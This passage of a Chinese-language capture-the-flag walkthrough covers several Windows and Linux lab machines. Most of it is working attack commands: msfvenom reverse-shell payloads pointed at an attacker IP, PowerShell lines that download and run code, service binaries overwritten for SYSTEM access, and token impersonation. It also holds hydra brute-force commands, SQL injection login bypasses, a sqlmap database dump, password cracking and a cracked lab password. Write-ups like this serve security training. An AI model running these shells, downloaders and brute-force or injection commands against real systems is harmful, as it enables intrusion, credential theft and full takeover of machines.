'IObitUnSvr' -Path CanRestart : False Name : IObitUnSvr Check : Unquoted Service Paths ServiceName : IObitUnSvr Path : C:\\Program Files (x86)\\IObit\\IObit Uninstaller\\IUService.exe ModifiablePath : @{ModifiablePath=C:\\; IdentityReference=BUILTIN\\Users; Permissions=WriteData/AddFile} StartName : LocalSystem AbuseFunction : Write-ServiceBinary -Name 'IObitUnSvr' -Path CanRestart : False Name : IObitUnSvr Check : Unquoted Service Paths ServiceName : IObitUnSvr Path : C:\\Program Files (x86)\\IObit\\IObit Uninstaller\\IUService.exe ModifiablePath : @{ModifiablePath=C:\\Program Files (x86)\\IObit; IdentityReference=STEELMOUNTAIN\\bill; Permissions=System.Object[]} StartName : LocalSystem AbuseFunction : Write-ServiceBinary -Name 'IObitUnSvr' -Path CanRestart : False Name : IObitUnSvr Check : Unquoted Service Paths ServiceName : IObitUnSvr Path : C:\\Program Files (x86)\\IObit\\IObit Uninstaller\\IUService.exe ModifiablePath : @{ModifiablePath=C:\\Program Files (x86)\\IObit\\IObit Uninstaller\\IUService.exe; IdentityReference=STEELMOUNTAIN\\bill; Permissions=System.Object[]} StartName : LocalSystem AbuseFunction : Write-ServiceBinary -Name 'IObitUnSvr' -Path CanRestart : False Name : IObitUnSvr Check : Unquoted Service Paths ServiceName : LiveUpdateSvc Path : C:\\Program Files (x86)\\IObit\\LiveUpdate\\LiveUpdate.exe ModifiablePath : @{ModifiablePath=C:\\; IdentityReference=BUILTIN\\Users; Permissions=AppendData/AddSubd irectory} StartName : LocalSystem AbuseFunction : Write-ServiceBinary -Name 'LiveUpdateSvc' -Path CanRestart : False Name : LiveUpdateSvc Check : Unquoted Service Paths ServiceName : LiveUpdateSvc Path : C:\\Program Files (x86)\\IObit\\LiveUpdate\\LiveUpdate.exe ModifiablePath : @{ModifiablePath=C:\\; IdentityReference=BUILTIN\\Users; Permissions=WriteData/AddFile} StartName : LocalSystem AbuseFunction : Write-ServiceBinary -Name 'LiveUpdateSvc' -Path CanRestart : False Name : LiveUpdateSvc Check : Unquoted Service Paths ServiceName : LiveUpdateSvc Path : C:\\Program Files (x86)\\IObit\\LiveUpdate\\LiveUpdate.exe ModifiablePath : @{ModifiablePath=C:\\Program Files (x86)\\IObit\\LiveUpdate\\LiveUpdate.exe; IdentityReference=STEELMOUNTAIN\\bill; Permissions=System.Object[]} StartName : LocalSystem AbuseFunction : Write-ServiceBinary -Name 'LiveUpdateSvc' -Path CanRestart : False Name : LiveUpdateSvc Check : Unquoted Service Paths ServiceName : AdvancedSystemCareService9 Path : C:\\Program Files (x86)\\IObit\\Advanced SystemCare\\ASCService.exe ModifiableFile : C:\\Program Files (x86)\\IObit\\Advanced SystemCare\\ASCService.exe ModifiableFilePermissions : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory.. .} ModifiableFileIdentityReference : STEELMOUNTAIN\\bill StartName : LocalSystem AbuseFunction : Install-ServiceBinary -Name 'AdvancedSystemCareService9' CanRestart : True Name : AdvancedSystemCareService9 Check : Modifiable Service Files ServiceName : IObitUnSvr Path : C:\\Program Files (x86)\\IObit\\IObit Uninstaller\\IUService.exe ModifiableFile : C:\\Program Files (x86)\\IObit\\IObit Uninstaller\\IUService.exe ModifiableFilePermissions : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory.. .} ModifiableFileIdentityReference : STEELMOUNTAIN\\bill StartName : LocalSystem AbuseFunction : Install-ServiceBinary -Name 'IObitUnSvr' CanRestart : False Name : IObitUnSvr Check : Modifiable Service Files ServiceName : LiveUpdateSvc Path : C:\\Program Files (x86)\\IObit\\LiveUpdate\\LiveUpdate.exe ModifiableFile : C:\\Program Files (x86)\\IObit\\LiveUpdate\\LiveUpdate.exe ModifiableFilePermissions : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory.. .} ModifiableFileIdentityReference : STEELMOUNTAIN\\bill StartName : LocalSystem AbuseFunction : Install-ServiceBinary -Name 'LiveUpdateSvc' CanRestart : False Name : LiveUpdateSvc Check : Modifiable Service Files 查看输出，有一个特定服务的 CanRestart 选项被设置为 true，此选项被设置为 true 后，我们就能够在系统上重新启动此服务；而且这个应用程序的目录也是可写的，这意味着我们可以用一个恶意应用程序替换合法的应用程序，一旦服务重新启动，我们的恶意程序将运行。 ServiceName ：AdvancedSystemCareService9 ModifiablePath：C:\\Program Files (x86)\\IObit\\Advanced SystemCare\\ASCService.exe msfvenom可用于生成反向shell的payload并将其输出为windows可执行文件，我们用msfvenom来生成一个和之前的应用程序同名的恶意应用程序: #msfvenom -p windows/shell_reverse_tcp LHOST=&lt;local_ip&gt; LPORT=&lt;local_port&gt; -e x86/shikata_ga_nai -f exe-service -o filename.exe msfvenom -p windows/shell_reverse_tcp LHOST=10.11.81.232 LPORT=8888 -e x86/shikata_ga_nai -f exe -o ASCService.exe meterpreter &gt; upload /opt/windows/PowerSploit/ASCService.exe [*] Uploading : /opt/windows/PowerSploit/ASCService.exe -&gt; ASCService.exe [*] Uploaded 72.07 KiB of 72.07 KiB (100.0%): /opt/windows/PowerSploit/ASCService.exe -&gt; ASCService.exe [*] Completed : /opt/windows/PowerSploit/ASCService.exe -&gt; ASCService.exe meterpreter &gt; shell Process 2412 created. Channel 6 created. Microsoft Windows [Version 6.3.9600] (c) 2013 Microsoft Corporation. All rights reserved. C:\\Users\\bill\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup&gt;sc stop AdvancedSystemCareService9 sc stop AdvancedSystemCareService9 SERVICE_NAME: AdvancedSystemCareService9 TYPE : 110 WIN32_OWN_PROCESS (interactive) STATE : 4 RUNNING (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN) WIN32_EXIT_CODE : 0 (0x0) SERVICE_EXIT_CODE : 0 (0x0) CHECKPOINT : 0x0 WAIT_HINT : 0x0 C:\\Users\\bill\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup&gt;dir dir Volume in drive C has no label. Volume Serial Number is 2E4A-906A Directory of C:\\Users\\bill\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup 04/03/2024 08:48 PM . 04/03/2024 08:48 PM .. 04/03/2024 08:27 PM %TEMP% 04/03/2024 08:48 PM 73,802 ASCService.exe 02/16/2014 01:58 PM 760,320 hfs.exe 04/03/2024 08:38 PM 600,580 PowerUp.ps1 3 File(s) 1,434,702 bytes 3 Dir(s) 44,154,744,832 bytes free C:\\Users\\bill\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup&gt;copy ASCService.exe \"C:\\Program Files (x86)\\IObit\\ Advanced SystemCare\\ASCService.exe\" copy ASCService.exe \"C:\\Program Files (x86)\\IObit\\Advanced SystemCare\\ASCService.exe\" Overwrite C:\\Program Files (x86)\\IObit\\Advanced SystemCare\\ASCService.exe? (Yes/No/All): yes yes 1 file(s) copied. 关于SC命令（Windows shell不区分大小写）： SC命令的格式：SC [Servername] command Servicename [Optionname= Optionvalues] Servername：指定服务所在的远程服务器的名称。名称必须采用通用命名约定 (UNC) 格式（“\\\\myserver”）。如果是在本地运行SC.exe，请忽略此参数。 command ：如query,start,stop,create,config等 Servicename：服务名，也就是要配置的那个服务的名字，例如你要启动一个服务你就输入sc start +你要启动的服务名称（并非是服务显示名称）。 Optionname= Optionvalues：是选项名和选项的值。 在重新启动服务之前，我们需要在攻击机终端中设置一个netcat侦听器:nc -lvnp 8888 不使用Metasploit获取初始访问权限并提权 注意：此处建议重启目标机。 现在，我们来看看如何在不使用 Metasploit 的情况下获得初始权限和进行权限提升。为此，我们将使用 PowerShell 和 winPEAS 来枚举目标系统并收集相关信息以提权到管理员用户。 我们还是使用之前提到的CVE编号所对应的漏洞来获取初始访问权限，然而，这次我们手动使用exp而不是通过msf来执行exp。 exp链接（一个python脚本）：https://www.exploit-db.com/exploits/39161 为了使这种攻击起作用，需要同时激活Web服务器和netcat侦听器，如果你的系统上还没有 netcat 静态二进制文件，那么你可以从GitHub下载。我们还将使用 winPEAS来枚举目标机系统信息。 netcat二进制文件：https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe winPEAS（在下载页选择winPEASx64.exe）：https://github.com/carlospolop/PEASS-ng/releases/tag/20221009 为了方便起见，我新建了一个文件夹放置刚才下载的三个文件（exp脚本使用之前–记得修改好ip和端口，下载的netcat二进制文件要修改名称为nc.exe）： 查看exp脚本内容，我们能够发现该脚本已经指定要调用名称为nc.exe的文件 然后需要开启3个独立的终端窗口来完成攻击： 终端1-通过python启用 HTTP web 服务器 #终端界面进入到SteelMountain目录 #python3 -m http.server 8000 无响应 python2 -m SimpleHTTPServer 80 终端2-设置netcat 监听器 nc -nvlp 8888 终端3-执行exp进行攻击（注意所用脚本的python版本） #终端界面进入到/home/hekeats/桌面/SteelMountain目录 python2 39161.py 10.10.61.11 8080 #第一次执行会将SteelMountain/目录下的nc.exe上传到目标系统 python2 39161.py 10.10.61.11 8080 #第二次执行会发送一个反向shell回连到攻击机监听器 在终端2界面 成功获取目标机的shell：（这里我执行了三次才行，估计是某些问题吧，应该是两次的） 使用Powershell相关命令将winPEAS脚本拉取到目标系统上： #使用终端2界面 cd C:\\Users\\Bill\\Desktop #Format is \"powershell -c \"command here\" powershell -c wget \"http://10.11.81.232/winPEASx64.exe\" -outfile \"winPEAS.exe\" 运行winPEAS脚本（枚举目标系统的信息，如服务名称等）： #使用终端2界面 winPEAS.exe #我们也可以运行powershell -c 命令手动查找服务名称:powershell -c \"Get-Service\" 运行winPEAS之后，查看输出的服务信息，观察在运行时\"未引用路径\"的服务名称： 使用msfvenom生成一个exe形式的反向shell payload，输出的文件名和服务对应的文件名相同（此处payload设置的端口，不要使用刚刚建立普通shell的端口）： #使用终端3界面 msfvenom -p windows/shell_reverse_tcp LHOST=10.11.81.232 LPORT=8888 -e x86/shikata_ga_nai -f exe -o ASCService.exe 然后可以通过 PowerShell 将这些数据传输到目标系统中: #使用终端2界面 powershell -c wget \"http://10.11.81.232/ASCService.exe\" -outfile \"ASCService.exe\" 总结 依旧是nmap扫描，这里靠的是目标站web站点的漏洞，其中使用的是rejetto http file server，发现存在对应漏洞，接着利用msf成功拿到shell，接着就是提权，首先是通过powershell某个脚本，枚举出对方服务器的某个服务存存在配置错误问题，接着msfvenom生成了一个reverse_shell木马，上传到目标机，替换对应服务的exe之后，重新运行，拿到system权限。 然后还介绍了一个不通过msf提权的方法，主要就是利用exploit漏洞库对应的cve脚本，凭借该脚本利用方式还需要准备，nc.exe，winPEAS.exe，接着先监听拿到shell，上传winPEAS.exe来枚举靶机发现存在没有使用双引号引用路径的脆弱服务，按照上面的思路，依旧是替换他，重新运行，也是成功提权 0x05 Alfred挑战 在这个房间里，我们将学习如何利用广泛使用的自动化服务器上的常见错误配置（Jenkins - 此工具用于创建持续集成/持续开发管道，允许开发人员在对代码进行更改后自动部署其代码）。之后，我们将使用一个有趣的权限提升方法来获得完整的系统访问权限。 由于这是一个 Windows 应用程序，我们将使用 Nishang 来获得初始访问权限。存储库包含一组有用的脚本，用于初始访问、枚举和权限提升。在本例中，我们将使用反向 shell 脚本。 请注意，此计算机不响应 ping （ICMP），可能需要几分钟才能启动。——我说怎么ping不通，以为我自己的问题 初始访问 直接上nmap扫描：nmap -T5 -sV -sC 10.10.40.248 -Pn 接下来一个个访问发现在8080存在一个Jenkins工具，找到其工具下的一个命令执行功能，上传对应的powershell反弹shell脚本，最后执行，具体如下图 powershell iex (New-Object Net.WebClient).DownloadString('http://10.11.81.232:81/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.11.81.232 -Port 5555 //构建好payload 如下图，在首页点击new item创建新项目，接着到build功能下，写入payload，最后点击apply再save保存 保存来到首页，点击build now，发现得到shell 切换shell 为了使权限提升变得更容易，让我们使用以下过程切换普通的反向shell到 Meterpreter shell。 第一步使用 msfvenom 创建一个能够生成Windows Meterpreter 反向shell的exe文件： msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.11.81.232 LPORT=5555 -f exe -o hybcx.exe 以上有效载荷将生成一个经过编码处理的 x86-64 反向 tcp meterpreter shell文件，使用编码处理在一定程度上可以确保所生成的shell文件能够被正确传输，并且还可以逃避一些反病毒软件。 第二步，把生成的exe文件转移到nishang/Shells目录下，在nishang/Shells目录下创建http服务（python3 -m http.server 8000），继续修改以下命令： powershell \"(New-Object System.Net.WebClient).Downloadfile('http://10.11.81.232:81/hybcx.exe','hybcx.exe')\" 进入之前获取的普通反向shell界面，运行以上命令：以上命令会下载攻击机中的指定exe文件到目标机上（也可以使用与上个任务相同的方式来下载exe文件至目标机） 第三步，在攻击机上另外启动一个终端 用于设置MSF监听器，命令如下： 之后靶机上启动对应exe程序 权限提升 现在我们有了初始访问权限，我们就可以尝试使用令牌模拟来获得system访问权限（system权限是Windows系统中的最高级别权限）。Windows 可以使用令牌来确保某个账户具有执行特定操作的正确权限，当用户成功登录或通过身份验证机制时，账户令牌（tokens ）就会被分配给账户，这通常由 LSASS.exe 完成（你可以将其视为一个身份验证进程）。 此访问令牌包括以下信息： user SIDs(security identifier) group SIDs privileges 除其他事项外，更详细的信息请参考：https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens 有两种类型的访问令牌： 主访问令牌(primary access tokens)：此类令牌是指与登录时所生成的用户账户相关联的令牌。 模拟令牌(impersonation tokens)：此类令牌能够允许特定进程（或进程中的线程）使用另一个（用户/客户端）进程的令牌来访问相关的资源。 对于模拟令牌，有不同的级别： SecurityAnonymous：当前 用户/客户端 不能模拟另一个 用户/客户端。 SecurityIdentification：当前 用户/客户端 可以获得客户端的身份和权限，但不能模拟客户端。 SecurityImpersonation：当前 用户/客户端 可以在本地系统上模拟客户端的安全上下文。 SecurityDelegation：当前 用户/客户端 可以在远程系统上模拟客户端的安全上下文。 tips：这里的安全上下文是指一个包含用户相关安全信息的数据结构。 账户所具有的权限（在账户创建时授予账户的权限或者从group处继承的权限）能够允许对应用户执行一些特定操作，以下是最常被滥用的特权： SeImpersonatePrivilege SeAssignPrimaryPrivilege SeTcbPrivilege SeBackupPrivilege SeRestorePrivilege SeCreateTokenPrivilege SeLoadDriverPrivilege SeTakeOwnershipPrivilege SeDebugPrivilege 更多关于令牌特权滥用的信息请参考：https://www.exploit-db.com/papers/42556 输入whoami /priv查看当前用户所有权限 可以看到目标机启用了两个关键权限（SeDebugPrivilege、SeImpersonatePrivilege），这两个权限能够让我们使用MSF中的模块来进行令牌模拟操作 接着在meterpreter shell中load incognito 模块加载完成之后 输入list_tokens -g命令检查哪些令牌可用，我们发现BUILTIN\\Administrators令牌可用，所以我们可以模拟管理员令牌，模拟完成后，再运行getuid命令，可以看到此时我们的uid已经变更为SYSTEM的uid，说明模拟令牌成功。 即使我们现在拥有更高特权的令牌（token ），我们实际上也可能没有对应的特权用户的权限（由于 Windows 处理权限的方式 - Windows会使用主令牌而不是模拟令牌来确定某个进程的权限分配情况）；所以我们还需要迁移到具有正确权限的进程，我们可以选择迁移到最安全的services.exe进程，首先使用ps命令查看所有进程，找到services.exe进程的PID，然后使用migrate PID-OF-PROCESS迁移到目标进程，具体命令如下： getpid #查看当前进程pid ps #查看所有的进程 migrate 668 #迁移到services.exe进程 需指定目标进程的PID号 总结 依旧是利用靶机的web站点缺点，对方含有jenkins组件，该组件的版本恰好存在漏洞，利用其中的某个功能能够执行命令，接着利用其执行了powershell的反弹shell脚本，nc监听拿到shell，之后为了稳定+方便，要切换到meterpreter shell，思路是msfvenom生成meterpreter reverse_shell上传到靶机之后，运行（在本地开了msf监听模块）之后成功拿到shell，之后利用模仿令牌来提权，load incognito看到对方可以模仿的令牌之后，利用命令成功模仿，但我们当前是模仿令牌但不是主令牌，因此需要migrate迁移到正确权限的程序，之后就成功提权（这里我没有尝试直接迁移会如何，下次得记着）。 0x06 HackPark挑战 连接到我们的网络并部署这台机器。请耐心等待，因为这台机器最多可能需要 5 分钟才能启动！您可以通过访问我们的访问页面来测试您是否连接到我们的网络。请注意，此计算机不响应 ping （ICMP），可能需要几分钟才能启动。 本会议室将介绍暴力破解帐户凭据、处理公共漏洞、使用 Metasploit 框架和 Windows 上的权限升级。 hydra暴力破解 Hydra 是一种并行化、快速且灵活的登录破解工具。 暴力破解会尝试使用多种密码组合进行登录。 字典攻击也是一种暴力破解，我们可以通过字典内容迭代来获取正确的密码组合。 我们需要找到一个登录页面来攻击并确定表单向网络服务器发出的请求类型。通常，Web 服务器发出两种类型的请求，一种是用于从 Web 服务器请求数据的 GET 请求，另一种是用于向服务器发送数据的 POST 请求。 您可以通过右键单击登录表单，检查元素，然后读取方法字段中的值来检查表单发出的请求。如果您通过 BurpSuite 拦截流量，您也可以识别这一点（可以在此处找到其他 HTTP 方法）。 Windows 网站登录表单使用什么请求类型？——POST类型 现在我们知道请求类型和登录表单的 URL，我们可以使用hydra对登陆框进行暴力破解。 我们将填充并使用以下命令： hydra -l &lt;username&gt; -P /usr/share/wordlists/&lt;wordlist&gt; &lt;ip&gt; http-post-form &lt;login request pattern&gt; #关于http-post-form：\"&lt;path to login form&gt;:&lt;body, with magic strings ^USER^ and ^PASS^&gt;:&lt;pattern that appears in an invalid login&gt;\" 需要填充的字段有：用户名（admin）和IP(靶机IP)以及字典（rockyou.txt），在http-post-from后加上网站登陆页的URL以及POST请求所对应的表单数据（表单数据可通过Burp抓取或者在浏览器端直接查看），其中用户名和密码要修改格式（USER和PASS），最后再加上登录错误时的提示语句“Login failed”（将浏览器语言设置为英文）。 具体命令如下： hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.9.70 http-post-form \"/Account/login.aspx:__VIEWSTATE=A79cd%2Fd56MBqXHayonGgo9MFuFbQU6QPgXzIC%2B9FMhzTK7iMPj4zufjKqn3GNZWqtmDPLnM3RtK7TkB%2BYvlEkWuMDAJirSykwjQ%2FxVGWAv5Cyji4ywzRTSm9iL8I8dMNvvhWDbZe6qWUFX%2FEOOnmbrp1mU4IPOxzJGSnYTY2CNw6wYAJHPUHh%2FB388uvKDteVckgTZtgt66yI8xd5etFdURzNBbnCs4dJswVuPShvKWGKbJUyHFJ5jadz4XvkArprAEcDAd9Ll%2F5zkDvEiLHoGYMwRJLCQj05O1NF7MYjsnmc0WKGMfbhqXmWkGAwpvRJolCxYkjmJfsevJUigud7%2BppQIWb%2BVcVi00Eo8qr1RtOJ%2FKB&amp;__EVENTVALIDATION=QRBLSmDgKfpCrfL79eVdKup%2FRJ91Bmhgi7SgxOupvZnLmSVshmyDfmOIr%2BKc%2FyeXqYKrM4YA%2FHCfDF3SfBc%2BT1Wpxa9ownCMxyjUQ5Y3drEvWm11h2mdfvuiMXcRGqkQ7Li8bDSDDgR13qwydwbPI6xcL1ciNTevksX%2BsVcHfSVf8W1w&amp;ctl00%24MainContent%24LoginUser%24UserName=^USER^&amp;ctl00%24MainContent%24LoginUser%24Password=^PASS^&amp;ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed\" d 这里需要将浏览器语言设置为英文，还需要配置登陆失败提示语（页面回显发现的） Hydra 有很多功能，并且有许多可用的“模块”（我们刚才使用的 http-post-form就是模块的一种），此工具不仅适用于暴力破解 HTTP 表单，还适用于破解其他计算机协议相关的登陆密码，例如 FTP、SSH、SMTP、SMB 等协议。 下面是一个关于Hydra的迷你备忘单： 命令 说明 hydra -P &lt;wordlist&gt; -v &lt;ip&gt; &lt;protocol&gt; 针对某一协议进行暴力破解操作 hydra -v -V -u -L &lt;username list&gt; -P &lt;password list&gt; -t 1 -u &lt;ip&gt; &lt;protocol&gt; 使用Hydra来暴力破解用户名和密码（-vV：表示使用详细模式）。 hydra -t 1 -V -f -l &lt;username&gt; -P &lt;wordlist&gt; rdp://&lt;ip&gt; 使用密码字典以攻击Windows远程桌面主机。 hydra -l &lt;username&gt; -P &lt;password list&gt; $ip -V http-form-post '/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log In&amp;testcookie=1:S=Location' 为Hydra提供更具体的信息以进行暴力破解操作。 获取目标web应用程序的初始shell 识别并执行一个公共漏洞利用脚本（来自 exploit-db.com）以在目标Windows机器上获得初始访问权限！ Exploit-Database 是一个 CVE（常见漏洞和泄露）存档库，该库用于保存一些公开漏洞exp和相应的易受攻击的软件信息，以便于渗透测试人员使用和开展漏洞研究。Exploit-Database 由 Offensive Security组织所维护（该组织同时也负责OSCP和Kali）。 登录进去之后发现该网站所使用的框架，上exploit搜索相关漏洞 搜到之后，跟着目录描述一步步拿到shell First, we set the TcpClient address and port within the method below to * our attack host, who has a reverse tcp listener waiting for a connection. * Next, we upload this file through the file manager. In the current (3.3.6) * version of BlogEngine, this is done by editing a post and clicking on the * icon that looks like an open file in the toolbar. Note that this file must * be uploaded as PostView.ascx. Once uploaded, the file will be in the * /App_Data/files directory off of the document root. The admin page that * allows upload is: 简单说就是现在exp文件修改监听端口和IP，接着在如下图所示的地方上传文件，注意文件名必须是PostView.ascx 之后访问指定目录：http://IP/?theme=../../App_Data/files即可拿到shell 权限提升 在此任务中，我们将了解 Windows 权限提升的基础知识。 首先，我们将从 netcat 转向 meterpreter 会话，并使用它来枚举机器以识别潜在的漏洞。然后，我们将使用收集到的信息来利用该系统并成为管理员。 上一小节建立的netcat 会话有点不稳定，我们可以使用 msfvenom 来建立一个新的反向shell。我们可以将普通shell升级为 meterpreter会话，此处需要使用 metasploit 来设置一个监听器。 首先，启动一个终端，运行metasploit并启动一个监听器。——老生常谈了 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.81.232 LPORT=5555 -e x86/shikata_ga_nai -f exe -o shell.exe 接着开启http服务，上传文件到目标机上 使用上一小节中所建立的shell界面拉取本地机中的exe文件到目标机上并执行该exe文件。 tips： 我们通常会发现目标系统的C:\\Windows\\Temp是全局可写的！我们可以利用这一点在目标机上操作–拉取本地机中的文件到目标系统上并尝试执行这些文件。 例子（前提是在本地机启动http服务器）：powershell -c “Invoke-WebRequest -Uri ‘ip/shell.exe’ -OutFile ‘C:\\Windows\\Temp\\shell.exe’” 使用 .\\filename.exe 在目标机上执行这些文件。 sysinfo查看目标系统版本信息 在此处：我们可以使用一个名为 WinPEAS 的工具。 WinPEAS 是一个脚本，它可以在 Windows 机器上找到可能会被攻击者利用的路径和服务。 脚本地址：https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS/winPEASexe 上传WinPEAS脚本文件到目标机（方法和之前类似，此处使用第三小节中建立的的普通shell界面进行上传，也可以使用刚才建立的meterpreter 会话进行上传） 异常服务就是上述的红色框中的，这里是看不出来运行的exe文件的，还需要进入systemscheduler目录下看看 如上图看到了众多的exe文件，但我们要找的是该服务会去运行的程序，因此需要进入Events事件查看器看一下该服务的运行日志 可以看到运行的程序文件为Message.exe，接下来就是使用该程序提升权限 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.81.232 LPORT=5555 -e x86/shikata_ga_nai -f exe -o Message.exe copy Message.exe \"C:\\Program Files (x86)\\SystemScheduler\\Message.exe\" 这样便成功覆盖上述正常exe文件，之后直接run运行监听模块即可，因为该服务会持续运行Message.exe 发现成功为管理员身份 没有 Metasploit 的权限升级 在这个任务中，我们将在不使用 meterpreter/metasploit 的情况下升级我们的权限！ 首先，我们将从我们已经建立的 netcat 会话转向更稳定的反向 shell。一旦我们确定了这一点，我们将使用winPEAS来枚举系统的潜在漏洞，然后再使用此信息上报给管理员。 msfvenom -p windows/shell_reverse_tcp LHOST=10.11.81.232 LPORT=8888 -e x86/shikata_ga_nai -f exe -o shell.exe powershell -c wget \"http://10.11.81.232:81/reverse.exe\" -outfile reverse.exe 最终成功拿到 总结 这里依旧是针对web站点的漏洞，首先测试发现存在可以暴力破解的html表单，使用hydra破解之后，发现该站点的组件存在漏洞，利用漏洞利用描述方法，nc监听拿到shell，之后就转换为meterpreter shell（老生常谈了，不赘述）然后上传winPEAS.exe发现存在服务配置缺陷，不过这里还有点东西的，因为你可以看到该服务目录下存在多个exe，无法判断该服务运行的是谁，因此需要到events，看一下该服务的运行日志发现了其运行exe，之后就明确了。 0x07 Game Zone挑战 本会议室将介绍 SQLi（手动和通过 SQLMap 利用此漏洞）、破解用户哈希密码、使用 SSH 隧道揭示隐藏服务以及使用 metasploit 有效负载获得 root 权限。 这里反向图片识别，发现该图片的人物名字为agent 47 通过SQLi获取访问权限 在本小节中，你将更多地了解 SQL（结构化查询语言）以及如何潜在地操纵查询语句以便与数据库进行通信。 SQL 是一种标准语言，用于在数据库中存储、编辑和检索数据。 SQL查询语句可能如下所示： SELECT FROM users WHERE username = ‘username’ AND password = ‘password’ 在目标靶机后台，当你尝试登录目标站点时，它会从登录页的用户名输入框和密码输入框中获取你所输入的值，然后将这些值直接插入到上面的查询语句中。 如果该查询语句找到有效数据得以匹配，你将被允许登录目标站点，否则将在登录页面上显示一条错误消息提示。 这是一个潜在的漏洞位置（登录框），因为你可以输入你所构造的用户名–将用户名构造为SQL 查询语句，这将写入、拼接并执行查询操作。 我们可以使用在上面学到的知识，在没有任何合法凭据的情况下操纵查询语句并实现登录行为。如果我们输入用户名 admin，输入密码' or 1=1 # 它会将密码中的值插入到后端查询语句中并验证我们的会话是否有效。 现在在 Web 服务器上执行的具体 SQL 查询如下： SELECT * FROM users WHERE username = ‘admin’ AND password =’ ’ or 1=1 # ’ 我们作为密码输入的额外SQL语句（' or 1=1 #）将会更改目标后端的初始查询为上述语句，这将中断初始查询过程并在 1==1 时继续（此时是管理员用户身份），然后我们将注释该查询的后接部分（使用**–**符号进行注释）以阻止SQL查询中断。 即使目标靶机的数据库中没有管理员用户，你仍然可以使用我们在上面所提到的值（' or 1=1 #）在不知道任何凭据的情况下完成登录。在登录页面，我们可以使用' or 1=1 #作为登录的用户名并将密码框一栏直接留空。 这里我在用户名的地方输入’ or 1=1 #，成功跳转 使用SQLmap SQLMap 是一种流行的开源自动 SQL 注入和数据库接管工具，它预装在所有版本的 Kali Linux 上，当然你也可以手动下载和安装SQLMap工具。 在web安全领域有许多不同类型的 SQL 注入（比如基于布尔的注入、基于时间的注入等），而SQLMap 工具将尝试使用不同的技术自动化整个注入过程。 我们将使用 SQLMap 针对目标靶机转储它的整个数据库–使用我们之前登录的页面，我们将 SQLMap 指向目标站点的评论搜索功能。 首先，我们需要使用 BurpSuite 拦截对目标站点的搜索功能的请求。 接着将上述内容cv到一个文件夹中，然后我们再将其传递给 SQLMap工具 以使用我们已经经过身份验证的用户会话。 sqlmap -r request.txt --dbms=mysql --dump -r 读取之前已保存的burpsuite所拦截的请求信息 –dbms 告诉 SQLMap 目标是什么类型的数据库管理系统 –dump 尝试转储整个数据库数据（真实环境下请谨慎使用dump参数） 输入以上命令之后，将在终端启动SQLMap 并尝试使用不同的注入方法以验证一些易受攻击的漏洞，最终，它将会输出目标数据库中的数据信息到终端界面。 POST /portal.php HTTP/1.1 Host: 10.10.63.45 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Content-Type: application/x-www-form-urlencoded Content-Length: 15 Origin: http://10.10.63.45 Connection: close Referer: http://10.10.63.45/portal.php Cookie: PHPSESSID=2ggt1pm0albmt14khadge49ne0 Upgrade-Insecure-Requests: 1 searchitem=test 这里还是重换了一个靶机，刚开始的扫不出来漏洞。。。这里发现密码可以直接爆破出来 使用 JohnTheRipper 破解密码 我们需要学会使用工具来装13 开膛手约翰 (JTR) 是一种快速、免费且开源的密码破解程序，这个工具预装在所有 Kali Linux 机器上。我们将使用JTR程序来破解我们之前获得的哈希密码值， JohnTheRipper 已有 15 年历史，当然还有一些其他密码破解程序例如 HashCat等。 JohnTheRipper程序的工作原理是先获取一个密码单词表，然后用指定的hash算法对其进行散列处理，再将其与目标散列密码（hash密码值）进行比较，如果两个散列密码相同，则表示已找到目标散列密码所对应的明文密码–即破解成功。因为我们不能直接反转目标散列值来得到明文密码，所以我们需要通过比较散列值来完成对目标hash值的猜解过程。 在本地攻击机上安装 JohnTheRipper 后，你可以使用以下参数针对目标哈希进行破解： john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=Raw-SHA256 –wordlist - 是你用来破解目标哈希值的密码单词列表 hash.txt - 包含目标哈希值的列表（在一般情况下它的内容只是 1 个哈希值） –format - 指明将要使用的散列算法类型，在上面的命令中，它表示使用 SHA256 算法进行哈希处理。 ssh agent47@10.10.63.45 使用反向 SSH 隧道暴露目标隐藏服务 反向 SSH 端口转发能够 指定将远程服务器主机上的给定端口转发到本地端的给定主机和端口。 -L 是本地隧道 (YOU &lt;-- CLIENT 由远程客户端到你的本地机)。 如果某个站点被阻止，你可以将流量转发到你所拥有的服务器上并查看它。 例如，如果站点imgur在工作中被阻止，你可以执行 ssh -L 9000:imgur.com:80 user@example.com，然后在你的本地机器上访问 localhost:9000，这将使用你所拥有的其他服务器加载站点imgur的流量。 -R 是远程隧道（YOU --&gt; CLIENT 由你的本地机到远程客户端）。 这意味着你将流量转发到另一台服务器以供其他人查看，该过程与上面的本地隧道示例类似，但加载流量的结果相反。 我们将使用一个名为 ss 的工具来调查主机上所运行的套接字（socket ），如果我们运行命令 ss -tulpn 它将告诉我们主机上正在运行哪些套接字（socket ）连接。 接着我们访问本地10000端口即可 这里利用agent47用户密码登录即可查看 提升权限到root 根据CMS版本，使用 Metasploit 搜索能够针对目标机器执行的有效负载 即payload。 启动msf，搜索可用模块。 设置参数并执行payload。 set PAYLOAD payload/cmd/unix/reverse options set USERNAME agent47 set PASSWORD videogamer124 set RHOSTS 127.0.0.1 set LHOST 10.13.16.58 